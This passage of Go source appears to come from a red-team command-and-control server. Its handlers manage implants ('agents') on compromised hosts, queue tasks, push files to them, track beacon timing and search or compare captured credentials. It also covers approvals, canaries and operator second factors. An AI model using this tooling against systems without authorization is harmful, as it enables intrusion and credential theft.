			"id": art.ID, "kind": art.Kind, "ref": art.Ref, "sha256": art.Hash,
			"size": art.Size, "agent_id": art.AgentID, "task_id": art.TaskID,
			"taken": art.Taken.Format(time.RFC3339), "taken_by": art.TakenBy,
		})

	case "case.close":
		// The case is closed.  The last event of the chain says who
		// closed it and when, and the chain cannot be reopened.
		if s.Cases == nil {
			return fail("case.close: this server has no case registry")
		}
		id, _ := args["id"].(string)
		note, _ := args["note"].(string)
		if err := s.Cases.Close(id, op.Name, note); err != nil {
			return fail("case.close: %v", err)
		}
		if err := s.Cases.Save(); err != nil {
			s.Log.Warn("the case registry could not be saved", "err", err)
		}
		c, found := s.Cases.Get(id)
		if !found {
			return fail("case.close: no such case %q", id)
		}
		return reply(upk.Map{
			"id": id, "state": casefile.StateClosed,
			"closed": c.Closed.Format(time.RFC3339), "head": c.Head,
		})

	// ---- the two-person rule -------------------------------------------
	case "approval.request":
		// An operation that waits for a second pair of eyes.
		//
		// The request is not a task: it is the promise that a task will
		// be queued once somebody else says yes.  It carries the kind of
		// the operation and its arguments, so the decision does the
		// thing the requester meant.
		if s.Approvals == nil {
			return fail("approval.request: this server has no queue of approvals")
		}
		kind, _ := args["kind"].(string)
		agentID, _ := args["agent"].(string)
		reason, _ := args["reason"].(string)
		taskArgs := map[string]any{}
		if raw, ok := args["args"].(map[string]any); ok {
			for k, v := range raw {
				taskArgs[k] = v
			}
		}
		req, err := s.Approvals.Request(approval.Request{
			Kind:        kind,
			AgentID:     agentID,
			Args:        taskArgs,
			Reason:      reason,
			RequestedBy: op.Name,
		})
		if err != nil {
			return fail("approval.request: %v", err)
		}
		if err := s.Approvals.Save(); err != nil {
			s.Log.Warn("the queue of approvals could not be saved", "err", err)
		}
		return reply(upk.Map{
			"id": req.ID, "kind": req.Kind, "agent_id": req.AgentID,
			"state": req.State, "requested_by": req.RequestedBy,
			"requested_at": req.RequestedAt.Format(time.RFC3339),
			"expires_at":   req.ExpiresAt.Format(time.RFC3339),
			"reason":       req.Reason,
		})

	case "approval.list":
		// The queue of the team: what waits, and what was decided.
		if s.Approvals == nil {
			return fail("approval.list: this server has no queue of approvals")
		}
		state, _ := args["state"].(string)
		items := s.Approvals.List(state)
		rows := make([]any, 0, len(items))
		for _, req := range items {
			rows = append(rows, approvalMap(req))
		}
		return reply(upk.Map{"requests": rows, "count": int64(len(rows))})

	case "approval.get":
		if s.Approvals == nil {
			return fail("approval.get: this server has no queue of approvals")
		}
		id, _ := args["id"].(string)
		req, found := s.Approvals.Get(id)
		if !found {
			return fail("approval.get: no such request %q", id)
		}
		return reply(approvalMap(req))

	case "approval.approve", "approval.deny":
		// The decision does the work.
		//
		// The operator who asked for the operation cannot decide it:
		// the queue refuses that, and the refusal is the whole point
		// of the rule.  When the decision is "yes", the operation is
		// queued on the host right away.
		if s.Approvals == nil {
			return fail("%s: this server has no queue of approvals", cmd)
		}
		id, _ := args["id"].(string)
		note, _ := args["note"].(string)
		approve := cmd == "approval.approve"
		req, err := s.Approvals.Decide(id, op.Name, approve, note)
		if err != nil {
			return fail("%s: %v", cmd, err)
		}
		if err := s.Approvals.Save(); err != nil {
			s.Log.Warn("the queue of approvals could not be saved", "err", err)
		}
		out := approvalMap(req)
		if approve && req.AgentID != "" && req.Kind != "" {
			t, err := s.Hub.SubmitTask(req.AgentID, req.Kind, req.Args)
			if err != nil {
				return fail("%s: the request was approved but the task could not be queued: %v", cmd, err)
			}
			out["task_id"] = t.ID
			out["agent_id"] = t.AgentID
		}
		return reply(out)

	// ---- the tripwires --------------------------------------------------
	case "canary.plant":
		// A tripwire is planted on a host: a small file with a secret
		// in it, in a place where nothing of the engagement belongs.
		//
		// The token is written by the implant and kept by nobody but
		// the ledger: the operator does not need it, and it does not
		// travel on the wire.
		if s.Canaries == nil {
			return fail("canary.plant: this server has no ledger of canaries")
		}
		agentID, _ := args["agent"].(string)
		label, _ := args["label"].(string)
		note, _ := args["note"].(string)
		if agentID == "" {
			return fail("canary.plant: a canary needs the host it is planted on")
		}
		secret, err := crypt.RandomBytes(32)
		if err != nil {
			return fail("canary.plant: %v", err)
		}
		c, err := s.Canaries.Plant(canary.Canary{
			Label:   label,
			Token:   hex.EncodeToString(secret),
			AgentID: agentID,
			Kind:    "file",
			Note:    note,
		})
		if err != nil {
			return fail("canary.plant: %v", err)
		}
		taskArgs := map[string]any{
			"id":    c.ID,
			"token": c.Token,
			"label": c.Label,
		}
		t, err := s.Hub.SubmitTask(agentID, "canary.plant", taskArgs)
		if err != nil {
			// The canary was never planted: it does not go into the
			// ledger, because a ledger that says "planted" for a file
			// that does not exist is a lie.
			_ = s.Canaries.Remove(c.ID)
			return fail("canary.plant: %v", err)
		}
		if err := s.Canaries.Save(); err != nil {
			s.Log.Warn("the ledger of the canaries could not be saved", "err", err)
		}
		return reply(upk.Map{
			"id": c.ID, "label": c.Label, "agent_id": c.AgentID,
			"state": c.State, "task_id": t.ID,
			"planted_at": c.PlantedAt.Format(time.RFC3339),
		})

	case "canary.list":
		if s.Canaries == nil {
			return fail("canary.list: this server has no ledger of canaries")
		}
		agentID, _ := args["agent"].(string)
		items := s.Canaries.ForHost(agentID)
		rows := make([]any, 0, len(items))
		for _, c := range items {
			rows = append(rows, canaryMap(c))
		}
		return reply(upk.Map{"canaries": rows, "count": int64(len(rows))})

	case "canary.get":
		if s.Canaries == nil {
			return fail("canary.get: this server has no ledger of canaries")
		}
		id, _ := args["id"].(string)
		c, found := s.Canaries.Get(id)
		if !found {
			return fail("canary.get: no such canary %q", id)
		}
		return reply(canaryMap(c))

	case "canary.check":
		// The look: every host that has tripwires is asked about them,
		// and the answer of the implant says whether the files are as
		// they were planted.
		if s.Canaries == nil {
			return fail("canary.check: this server has no ledger of canaries")
		}
		var targets []*store.Agent
		agentID, _ := args["agent"].(string)
		if all, _ := args["all"].(bool); all {
			targets = s.Hub.SelectAgents(hub.AgentFilter{})
		} else if agentID != "" {
			targets = s.Hub.SelectAgents(hub.AgentFilter{IDs: []string{agentID}})
		} else {
			selected, err := s.selectTargets(args)
			if err != nil {
				return fail("canary.check: %v", err)
			}
			targets = selected
		}
		if len(targets) == 0 {
			return fail("canary.check: no agents matched")
		}
		rows := make([]any, 0, len(targets))
		asked := 0
		for _, a := range targets {
			items := s.Canaries.ForHost(a.ID)
			if len(items) == 0 {
				continue
			}
			asked++
			list := make([]any, 0, len(items))
			for _, c := range items {
				list = append(list, upk.Map{"id": c.ID})
			}
			t, err := s.Hub.SubmitTask(a.ID, "canary.check", map[string]any{"canaries": list})
			if err != nil {
				rows = append(rows, upk.Map{"agent_id": a.ID, "error": err.Error()})
				continue
			}
			rows = append(rows, upk.Map{
				"agent_id": a.ID, "task_id": t.ID, "state": t.State,
				"canaries": int64(len(items)),
			})
		}
		return reply(upk.Map{"tasks": rows, "count": int64(len(rows)), "asked": int64(asked)})

	case "canary.remove":
		// The operator stops watching the tripwire.  The file on the
		// host stays where it is: this removes the watch, not the file.
		if s.Canaries == nil {
			return fail("canary.remove: this server has no ledger of canaries")
		}
		id, _ := args["id"].(string)
		if err := s.Canaries.Remove(id); err != nil {
			return fail("canary.remove: %v", err)
		}
		if err := s.Canaries.Save(); err != nil {
			s.Log.Warn("the ledger of the canaries could not be saved", "err", err)
		}
		return reply(upk.Map{"id": id, "removed": true})

	// ---- the file of a host ---------------------------------------------
	case "dossier.get":
		// The file of one host: what the server knows about it and what
		// it did to it, on one page.
		agentID, _ := args["agent"].(string)
		if agentID == "" {
			agentID, _ = args["id"].(string)
		}
		d, found := s.Dossier(agentID)
		if !found {
			return fail("dossier.get: no such host %q", agentID)
		}
		return reply(dossierMap(d))

	case "dossier.list":
		// The files of every host, the weakest first: the host that
		// needs attention comes before the host that does not.
		agents := s.Hub.SelectAgents(hub.AgentFilter{})
		dossiers := make([]dossier.Dossier, 0, len(agents))
		for _, a := range agents {
			d, found := s.Dossier(a.ID)
			if !found {
				continue
			}
			dossiers = append(dossiers, d)
		}
		sort.SliceStable(dossiers, func(i, j int) bool {
			if dossiers[i].Score == dossiers[j].Score {
				return dossiers[i].ID < dossiers[j].ID
			}
			return dossiers[i].Score < dossiers[j].Score
		})
		rows := make([]any, 0, len(dossiers))
		for _, d := range dossiers {
			rows = append(rows, dossierMap(d))
		}
		return reply(upk.Map{"dossiers": rows, "count": int64(len(rows))})

	// ---- the notes the team writes about a host ----------------------------
	case "note.add":
		// A line of words about a host, written by the operator who is
		// asking for it.  The notes travel with the dossier of the host,
		// so a note that is not where the host is looked at is a note
		// nobody finds.
		if s.Notes == nil {
			return fail("note.add: this server has no note ledger")
		}
		agentID, _ := args["agent"].(string)
		text, _ := args["text"].(string)
		entry, err := s.Notes.Add(note.Note{
			AgentID: agentID,
			Text:    text,
			Author:  op.Name,
		})
		if err != nil {
			return fail("note.add: %v", err)
		}
		if err := s.Notes.Save(); err != nil {
			s.Log.Warn("the note ledger could not be saved", "err", err)
		}
		return reply(upk.Map{
			"id": entry.ID, "agent_id": entry.AgentID, "text": entry.Text,
			"author": entry.Author, "written": entry.Written.Format(time.RFC3339),
		})

	case "note.list":
		if s.Notes == nil {
			return fail("note.list: this server has no note ledger")
		}
		agentID, _ := args["agent"].(string)
		items := s.Notes.List(agentID)
		rows := make([]any, 0, len(items))
		for _, entry := range items {
			rows = append(rows, noteMap(entry))
		}
		return reply(upk.Map{"notes": rows, "count": int64(len(rows))})

	case "note.remove":
		if s.Notes == nil {
			return fail("note.remove: this server has no note ledger")
		}
		entryID, _ := args["id"].(string)
		if err := s.Notes.Remove(entryID); err != nil {
			return fail("note.remove: %v", err)
		}
		if err := s.Notes.Save(); err != nil {
			s.Log.Warn("the note ledger could not be saved", "err", err)
		}
		return reply(upk.Map{"id": entryID, "removed": true})

	case "note.show":
		if s.Notes == nil {
			return fail("note.show: this server has no note ledger")
		}
		entryID, _ := args["id"].(string)
		entry, found := s.Notes.Get(entryID)
		if !found {
			return fail("note.show: no such note %q", entryID)
		}
		return reply(noteMap(entry))

	// ---- the wires to the outside world ----------------------------------
	case "hook.add":
		// A wire is the address of a place the team chose, the kinds it
		// wants to hear about and the secret that signs the posts.  The
		// server posts to it and never asks it anything: a wire that
		// could reach back would be a second way into the server.
		if s.Hooks == nil {
			return fail("hook.add: this server has no wires")
		}
		raw, _ := args["url"].(string)
		secret, _ := args["secret"].(string)
		entry, err := s.Hooks.Add(hook.Hook{
			URL:     raw,
			Kinds:   stringList(args["kinds"]),
			Secret:  secret,
			Creator: op.Name,
		})
		if err != nil {
			return fail("hook.add: %v", err)
		}
		if err := s.Hooks.Save(); err != nil {
			s.Log.Warn("the ledger of the wires could not be saved", "err", err)
		}
		return reply(upk.Map{
			"id": entry.ID, "url": entry.URL, "kinds": pathAny(entry.Kinds),
			"creator": entry.Creator, "created": entry.Created.Format(time.RFC3339),
		})

	case "hook.list":
		// The list of the wires carries the address and the last post,
		// never the secret: the word the posts are signed with is the
		// property of the file the server keeps.
		if s.Hooks == nil {
			return fail("hook.list: this server has no wires")
		}
		hooks := s.Hooks.List()
		rows := make([]any, 0, len(hooks))
		for _, entry := range hooks {
			last, found := s.Hooks.Last(entry.ID)
			rows = append(rows, hookMap(entry, last, found))
		}
		return reply(upk.Map{"hooks": rows, "count": int64(len(rows))})

	case "hook.remove":
		// The posts the wire made stay made; the wire is forgotten.
		if s.Hooks == nil {
			return fail("hook.remove: this server has no wires")
		}
		entryID, _ := args["id"].(string)
		if err := s.Hooks.Remove(entryID); err != nil {
			return fail("hook.remove: %v", err)
		}
		if err := s.Hooks.Save(); err != nil {
			s.Log.Warn("the ledger of the wires could not be saved", "err", err)
		}
		return reply(upk.Map{"id": entryID, "removed": true})

	case "hook.test":
		// The operator who wrote a wire down learns now whether the
		// other end is listening, instead of waiting for the
		// engagement to make news.
		if s.Hooks == nil {
			return fail("hook.test: this server has no wires")
		}
		entryID, _ := args["id"].(string)
		delivery, err := s.Hooks.Test(entryID, op.Name)
		if err != nil {
			return fail("hook.test: %v", err)
		}
		return reply(deliveryMap(delivery))

	// ---- the wall of the techniques the team uses ------------------------
	case "attack.coverage":
		// The wall counts the finished work against the catalogue of
		// the trade.  Reading it is a read: the answer changes nothing.
		agentID, _ := args["agent"].(string)
		tasks := s.Hub.Store().FilteredTasks(agentID, "", "", attackScanLimit)
		usages := attack.Coverage(tasks)
		rows := make([]any, 0, len(usages))
		for _, usage := range usages {
			rows = append(rows, usageMap(usage))
		}
		unmapped := attack.Unmapped(tasks)
		return reply(upk.Map{
			"techniques": rows,
			"covered":    int64(attack.Covered(usages)),
			"total":      int64(len(attack.Table)),
			"unmapped":   pathAny(unmapped),
			"agent":      agentID,
		})

	// ---- the digging box of the records ----------------------------------
	case "search.query":
		// One needle, every book: the tasks, the notes and the
		// credentials.  The box reads and never changes, so a viewer
		// may dig all day.
		query, _ := args["query"].(string)
		query = strings.TrimSpace(query)
		if query == "" {
			return fail("search.query: the needle was not written")
		}
		if len(query) > search.MaxQuery {
			return fail("search.query: the needle is too long")
		}
		scope, _ := args["scope"].(string)
		if scope == "" {
			scope = "all"
		}
		if scope != "all" && scope != "tasks" && scope != "notes" && scope != "creds" {
			return fail("search.query: the scope is %q, not all, tasks, notes or creds", scope)
		}
		agentID, _ := args["agent"].(string)
		limit, _ := asInt64(args["limit"])
		if limit <= 0 {
			limit = 25
		}
		if limit > 200 {
			limit = 200
		}
		out := upk.Map{"query": query, "scope": scope}
		count := 0
		if scope == "all" || scope == "tasks" {
			tasks := s.Hub.Store().FilteredTasks(agentID, "", "", searchScanLimit)
			hits := search.Tasks(tasks, query, int(limit))
			search.SortHits(hits)
			rows := make([]any, 0, len(hits))
			for _, hit := range hits {
				rows = append(rows, hitMap(hit))
			}
			out["tasks"] = rows
			count += len(rows)
		}
		if scope == "all" || scope == "notes" {
			var notes []note.Note
			if s.Notes != nil {
				notes = s.Notes.List(agentID)
			}
			hits := search.Notes(notes, query, int(limit))
			rows := make([]any, 0, len(hits))
			for _, hit := range hits {
				rows = append(rows, hitMap(hit))
			}
			out["notes"] = rows
			count += len(rows)
		}
		if scope == "all" || scope == "creds" {
			// The store narrows the rows by the needle; the secret of a
			// credential is never part of what is searched or shown.
			rows := s.Hub.Store().Credentials(agentID, "", query, int(limit))
			hits := search.Creds(rows, query, int(limit))
			lines := make([]any, 0, len(hits))
			for _, hit := range hits {
				lines = append(lines, hitMap(hit))
			}
			out["creds"] = lines
			count += len(lines)
		}
		out["count"] = int64(count)
		return reply(out)

	// ---- the rhythm of the beacons ---------------------------------------
	case "rhythm.get":
		// The shape of one host: the pauses between its check-ins, their
		// spread, and a name for the shape, next to the cadence the
		// operator asked for, because the plan and the world disagree
		// often enough to be worth printing side by side.
		if s.Rhythm == nil {
			return fail("rhythm.get: this server does not watch the breathing")
		}
		agentID, _ := args["agent"].(string)
		stats, found := s.Rhythm.Stats(agentID)
		if !found {
			return fail("rhythm.get: the host has not called home yet: %q", agentID)
		}
		out := rhythmMap(stats)
		if agent, ok := s.Hub.Store().Agent(agentID); ok {
			out["sleep"] = int64(agent.Sleep)
			out["jitter"] = int64(agent.Jitter)
		}
		return reply(out)

	case "rhythm.fleet":
		// The fleet, clocks first: the host a watcher can set a watch
		// by comes before the host that wanders, because the first
		// kind is the one to fix.
		if s.Rhythm == nil {
			return fail("rhythm.fleet: this server does not watch the breathing")
		}
		rows := make([]any, 0)
		for _, stats := range s.Rhythm.Fleet() {
			rows = append(rows, rhythmMap(stats))
		}
		return reply(upk.Map{"fleet": rows, "count": int64(len(rows))})

	// ---- the keys that open more than one door ---------------------------
	case "creds.reuse":
		// The same secret on two hosts is somebody reusing a key.  The
		// comparison is of digests, never of values: the reuse is
		// provable without the material leaving its vault.
		groups := s.Hub.Store().CredentialReuse()
		rows := make([]any, 0, len(groups))
		for _, group := range groups {
			rows = append(rows, reuseMap(group))
		}
		return reply(upk.Map{"groups": rows, "count": int64(len(rows))})

	// ---- the watches of the silences -------------------------------------
	case "silence.add":
		// A promise to worry: name the host and the pause that is news.
		// The watch reads the last moment of the check-ins and writes
		// nothing to the host; a watch for silence that knocked on the
		// door would wake what it watches.
		if s.Silences == nil {
			return fail("silence.add: this server watches no silences")
		}
		agentID, _ := args["agent"].(string)
		seconds, _ := asInt64(args["seconds"])
		cooldown, _ := asInt64(args["cooldown"])
		watch, err := s.Silences.Add(silence.Watch{
			AgentID:  agentID,
			Seconds:  seconds,
			Cooldown: cooldown,
			Creator:  op.Name,
		})
		if err != nil {
			return fail("silence.add: %v", err)
		}
		if err := s.Silences.Save(); err != nil {
			s.Log.Warn("the ledger of the silences could not be saved", "err", err)
		}
		return reply(watchMap(watch))

	case "silence.list":
		if s.Silences == nil {
			return fail("silence.list: this server watches no silences")
		}
		watches := s.Silences.List()
		rows := make([]any, 0, len(watches))
		out := upk.Map{"watches": rows, "count": int64(len(watches))}
		for _, w := range watches {
			row := watchMap(w)
			if agent, ok := s.Hub.Store().Agent(w.AgentID); ok {
				row["last_seen"] = agent.LastSeen.Format(time.RFC3339)
				row["quiet_for"] = int64(time.Since(agent.LastSeen).Seconds())
			}
			rows = append(rows, row)
		}
		out["watches"] = rows
		return reply(out)

	case "silence.remove":
		if s.Silences == nil {
			return fail("silence.remove: this server watches no silences")
		}
		entryID, _ := args["id"].(string)
		if err := s.Silences.Remove(entryID); err != nil {
			return fail("silence.remove: %v", err)
		}
		if err := s.Silences.Save(); err != nil {
			s.Log.Warn("the ledger of the silences could not be saved", "err", err)
		}
		return reply(upk.Map{"id": entryID, "removed": true})

	// ---- the baseline of the paths the team watches ----------------------
	case "baseline.add":
		// The path of the baseline is named and the host is named: the
		// rest of the entry says why the path is watched.  The server
		// does not ask the file itself: the look is queued through
		// baseline.check.
		if s.Baseline == nil {
			return fail("baseline.add: this server has no baseline")
		}
		agentID, _ := args["agent"].(string)
		path, _ := args["path"].(string)
		label, _ := args["label"].(string)
		note, _ := args["note"].(string)
		entry, err := s.Baseline.Add(baseline.Entry{
			AgentID: agentID,
			Path:    path,
			Label:   label,
			Note:    note,
			AddedBy: op.Name,
		})
		if err != nil {
			return fail("baseline.add: %v", err)
		}
		if err := s.Baseline.Save(); err != nil {
			s.Log.Warn("the baseline could not be saved", "err", err)
		}
		return reply(upk.Map{
			"id": entry.ID, "agent_id": entry.AgentID, "path": entry.Path,
			"state": entry.State, "added": entry.Added.Format(time.RFC3339),
		})

	case "baseline.list":
		if s.Baseline == nil {
			return fail("baseline.list: this server has no baseline")
		}
		agentID, _ := args["agent"].(string)
		state, _ := args["state"].(string)
		items := s.Baseline.List(agentID, state)
		rows := make([]any, 0, len(items))
		for _, entry := range items {
			rows = append(rows, baselineMap(entry))
		}
		return reply(upk.Map{"entries": rows, "count": int64(len(rows))})

	case "baseline.remove":
		// The operator stops watching the path; the file on the host
		// stays where it is.
		if s.Baseline == nil {
			return fail("baseline.remove: this server has no baseline")
		}
		entryID, _ := args["id"].(string)
		if err := s.Baseline.Remove(entryID); err != nil {
			return fail("baseline.remove: %v", err)
		}
		if err := s.Baseline.Save(); err != nil {
			s.Log.Warn("the baseline could not be saved", "err", err)
		}
		return reply(upk.Map{"id": entryID, "removed": true})

	case "baseline.check":
		// The look: the server asks the hosts about the paths that are
		// watched on them, and the answer of the implant says what is
		// there.  The findings travel in the metadata of the answer as
		// one short JSON string, so the ledger and the answer the
		// operator reads cannot disagree.
		if s.Baseline == nil {
			return fail("baseline.check: this server has no baseline")
		}
		agentID, _ := args["agent"].(string)
		if agentID == "" {
			return fail("baseline.check: the host was not named")
		}
		paths := s.Baseline.Paths(agentID)
		if len(paths) == 0 {
			return fail("baseline.check: no paths are watched on that host")
		}
		list := make([]any, 0, len(paths))
		for _, path := range paths {
			list = append(list, path)
		}
		t, err := s.Hub.SubmitTask(agentID, "baseline.look",
			map[string]any{"paths": list})
		if err != nil {
			return fail("baseline.check: %v", err)
		}
		return reply(upk.Map{
			"task_id": t.ID, "agent_id": t.AgentID, "state": t.State,
			"paths": int64(len(paths)),
		})

	// ---- the server-side file store ------------------------------------
	case "operator.otp.rotate":
		// A new secret for an operator.
		//
		// The secret is handed out once, here, and never again: the
		// server keeps it and the phone of the operator has it.  An
		// operator may rotate its own secret; turning the second
		// factor of somebody else on is the work of an admin.
		if s.OTP == nil {
			return fail("operator.otp.rotate: this server has no registry of second factors")
		}
		target, _ := args["operator"].(string)
		target = strings.TrimSpace(target)
		if target == "" {
			target = op.Name
		}
		if target != op.Name && !rbac.AtLeast(role, rbac.Admin) {
			return fail("operator.otp.rotate: only an admin may rotate the second factor of somebody else")
		}
		issuer, _ := args["issuer"].(string)
		sec, err := s.OTP.Rotate(target, issuer)
		if err != nil {
			return fail("operator.otp.rotate: %v", err)
		}
		if err := s.OTP.Save(); err != nil {
			s.Log.Warn("the registry of the second factors could not be saved", "err", err)
		}
		return reply(upk.Map{
			"operator": sec.Operator,
			"secret":   sec.Secret,
			"uri":      otp.URI(sec.Issuer, sec.Operator, sec.Secret),
			"enabled":  sec.Enabled,
			"rotated":  sec.Rotated.Format(time.RFC3339),
			"issuer":   sec.Issuer,
		})

	case "operator.otp.status":
		// Who has a second factor, and how old it is.
		//
		// The secrets are not in the answer: a list of second factors
		// that carries the secrets is a list that leaks them.
		if s.OTP == nil {
			return fail("operator.otp.status: this server has no registry of second factors")
		}
		items := s.OTP.Status()
		rows := make([]any, 0, len(items))
		for _, st := range items {
			rows = append(rows, upk.Map{
				"operator": st.Operator,
				"issuer":   st.Issuer,
				"enabled":  st.Enabled,
				"created":  st.Created.Format(time.RFC3339),
				"rotated":  st.Rotated.Format(time.RFC3339),
				"age":      st.Age,
			})
		}
		return reply(upk.Map{"operators": rows, "count": int64(len(rows))})

	case "operator.otp.remove":
		// The second factor of an operator is taken away.
		//
		// The console of that operator works with the token alone from
		// then on, which is what a team wants when a phone is lost.
		if s.OTP == nil {
			return fail("operator.otp.remove: this server has no registry of second factors")
		}
		target, _ := args["operator"].(string)
		target = strings.TrimSpace(target)
		if target == "" {
			target = op.Name
		}
		if target != op.Name && !rbac.AtLeast(role, rbac.Admin) {
			return fail("operator.otp.remove: only an admin may take away the second factor of somebody else")
		}
		if err := s.OTP.Remove(target); err != nil {
			return fail("operator.otp.remove: %v", err)
		}
		if err := s.OTP.Save(); err != nil {
			s.Log.Warn("the registry of the second factors could not be saved", "err", err)
		}
		return reply(upk.Map{"operator": target, "removed": true})

	// ---- the server-side file store ------------------------------------
	case "artifact.list":
		if s.Artifacts == nil {
			return fail("artifact.list: this server has no artifact store")
		}
		entries := s.Artifacts.List()
		out := make([]any, 0, len(entries))
		for _, e := range entries {
			out = append(out, upk.Map{
				"name":    e.Name,
				"sha256":  e.SHA256,
				"size":    e.Size,
				"created": e.Created.Format(time.RFC3339),
				"updated": e.Updated.Format(time.RFC3339),
			})
		}
		return reply(upk.Map{"artifacts": out, "count": int64(len(out))})

	case "artifact.put":
		// The upload is chunked: the frames are bounded, so a file arrives
		// as a series of appends at increasing offsets.  The last chunk
		// carries "eof" and is the one that writes the blob.
		if s.Artifacts == nil {
			return fail("artifact.put: this server has no artifact store")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("artifact.put needs a name")
		}
		data, _ := args["data"].([]byte)
		offset, _ := asInt64(args["offset"])
		eof, _ := args["eof"].(bool)
		if offset == 0 {
			// The first chunk starts a fresh upload and replaces whatever
			// was stored under the name before.
			if err := s.Artifacts.Begin(name); err != nil {
				return fail("artifact.put: %v", err)
			}
		}
		if len(data) > 0 {
			received, err := s.Artifacts.Append(name, offset, data)
			if err != nil {
				return fail("artifact.put: %v", err)
			}
			if !eof {
				return reply(upk.Map{"name": name, "received": int64(received), "eof": false})
			}
		} else if !eof {
			return reply(upk.Map{"name": name, "received": int64(s.Artifacts.Pending(name)), "eof": false})
		}
		entry, err := s.Artifacts.Finish(name)
		if err != nil {
			return fail("artifact.put: %v", err)
		}
		return reply(upk.Map{
			"name":   entry.Name,
			"sha256": entry.SHA256,
			"size":   entry.Size,
			"eof":    true,
		})

	case "artifact.get":
		if s.Artifacts == nil {
			return fail("artifact.get: this server has no artifact store")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("artifact.get needs a name")
		}
		offset, _ := asInt64(args["offset"])
		limit, _ := asInt64(args["limit"])
		data, entry, err := s.Artifacts.ReadRange(name, offset, limit)
		if err != nil {
			return fail("artifact.get: %v", err)
		}
		return reply(upk.Map{
			"name":   entry.Name,
			"sha256": entry.SHA256,
			"size":   entry.Size,
			"offset": offset,
			"eof":    offset+int64(len(data)) >= entry.Size,
			"data":   data,
		})

	case "artifact.remove":
		if s.Artifacts == nil {
			return fail("artifact.remove: this server has no artifact store")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("artifact.remove needs a name")
		}
		if err := s.Artifacts.Remove(name); err != nil {
			return fail("artifact.remove: %v", err)
		}
		return reply(upk.Map{"name": name, "removed": true})

	case "artifact.push":
		// The file travels to the agent as a chain of upload tasks, one per
		// chunk: the beacon writes them one after the other and only the
		// last one closes the file and reports its digest.
		if s.Artifacts == nil {
			return fail("artifact.push: this server has no artifact store")
		}
		name, _ := args["name"].(string)
		agentID, _ := args["agent"].(string)
		if agentID == "" {
			agentID, _ = args["id"].(string)
		}
		if name == "" {
			return fail("artifact.push needs a name")
		}
		if agentID == "" {
			return fail("artifact.push needs an agent")
		}
		raw, entry, err := s.Artifacts.Read(name)
		if err != nil {
			return fail("artifact.push: %v", err)
		}
		path, _ := args["path"].(string)
		if path == "" {
			path = "/tmp/" + entry.Name
		}
		stages := make([]hub.ChainStage, 0, 4)
		for off := 0; off < len(raw) || off == 0; off += artifactChunk {
			end := off + artifactChunk
			if end > len(raw) {
				end = len(raw)
			}
			stages = append(stages, hub.ChainStage{
				Kind: TaskKindUpload,
				Args: map[string]any{
					"path":   path,
					"offset": int64(off),
					"data":   raw[off:end],
					"eof":    end >= len(raw),
				},
			})
			if len(raw) == 0 {
				break
			}
		}
		task, chain, err := s.Hub.SubmitChain(agentID, op.Name, stages)
		if err != nil {
			return fail("artifact.push: %v", err)
		}
		return reply(upk.Map{
			"chain_id": chain.ID,
			"task_id":  task.ID,
			"agent_id": agentID,
			"stages":   int64(len(stages)),
			"size":     entry.Size,
			"sha256":   entry.SHA256,
			"path":     path,
		})

	// ---- the journal and the open sessions ----------------------------
	case "sessions.list": // The interactive sessions that are open, per agent.
		sessions := s.Hub.Sessions()
		rows := make([]any, 0, len(sessions))
		for _, sess := range sessions {
			rows = append(rows, upk.Map{
				"id":       sess.ID,
				"agent_id": sess.AgentID,
				"task_id":  sess.TaskID,
				"opened":   sess.Opened.Unix(),
				"last":     sess.Last.Unix(),
				"bytes":    int64(sess.Bytes),
			})
		}
		return reply(upk.Map{"sessions": rows, "count": len(rows)})

	case "events.list":
		// The journal of the recent events.  A console that was not
		// watching asks for the events after the last one it saw.
		after, _ := asInt64(args["after"])
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 100
		}
		events := s.Hub.Journal(uint64(after), int(limit))
		rows := make([]any, 0, len(events))
		var last uint64
		for _, ev := range events {
			rows = append(rows, eventMap(ev))
			last = ev.Seq
		}
		return reply(upk.Map{"events": rows, "count": len(rows), "seq": int64(last)})

	// ---- team synchronisation ----------------------------------------
	case "team.sync":
		agents := s.Hub.Agents()
		agentRows := make([]any, 0, len(agents))
		for _, a := range agents {
			agentRows = append(agentRows, toUpkMap(a))
		}
		ops := s.Hub.Operators()
		opRows := make([]any, 0, len(ops))
		for _, o := range ops {
			opRows = append(opRows, upk.Map{
				"name":      o.Name,
				"role":      o.Role,
				"peer":      o.Peer,
				"transport": o.Transport,
				"since":     o.Since,
				"focus":     o.Focus,
				"focus_at":  o.FocusAt,
				"idle_sec":  int64(o.IdleSec),
			})
		}
		messages := s.Hub.Chat(50)
		chatRows := make([]any, 0, len(messages))
		for _, m := range messages {
			row := upk.Map{
				"from": m.From,
				"role": m.Role,
				"text": m.Text,
				"at":   m.At.Unix(),
			}
			if m.To != "" {
				row["to"] = m.To
			}
			chatRows = append(chatRows, row)
		}
		return reply(upk.Map{
			"server_time": time.Now().Unix(),
			"version":     hub.Version,
			"agents":      agentRows,
			"operators":   opRows,
			"chat":        chatRows,
		})

	// ---- the handover -------------------------------------------------
	case "team.handover":
		// The handover: everything a colleague needs to take the
		// engagement over.  The server knows the engagement; the console
		// adds its own notes to the document it renders from this.
		agents := s.Hub.SelectAgents(hub.AgentFilter{})
		agentRows := make([]any, 0, len(agents))
		for _, a := range agents {
			row := upk.Map{
				"id":    a.ID,
				"host":  a.Host,
				"os":    a.OS,
				"arch":  a.Arch,
				"user":  a.User,
				"last":  a.LastSeen.Unix(),
				"state": a.State,
			}
			if len(a.Tags) > 0 {
				row["tags"] = stringsToAny(a.Tags)
			}
			if a.FirstSeen.Unix() > 0 {
				row["first"] = a.FirstSeen.Unix()
			}
			agentRows = append(agentRows, row)
		}
		// The tasks that are still open: the queue of the engagement.
		open := s.Hub.Store().FilteredTasksFor("", "", "queued", "", 0)
		open = append(open, s.Hub.Store().FilteredTasksFor("", "", "delivered", "", 0)...)
		taskRows := make([]any, 0, len(open))
		for _, t := range open {
			row := upk.Map{
				"id":       t.ID,
				"agent_id": t.AgentID,
				"kind":     t.Kind,
				"state":    t.State,
				"created":  t.Created.Unix(),
			}
			if t.ClaimedBy != "" {
				row["claimed_by"] = t.ClaimedBy
			}
			if t.AssignedTo != "" {
				row["assigned_to"] = t.AssignedTo
			}
			taskRows = append(taskRows, row)
		}
		// The findings: the reconnaissance the team already ran.
		findings := s.Hub.Store().FilteredTasksFor("", "recon", "", "", 0)
		findingRows := make([]any, 0, len(findings))
		for _, t := range findings {
			row := upk.Map{
				"task_id":  t.ID,
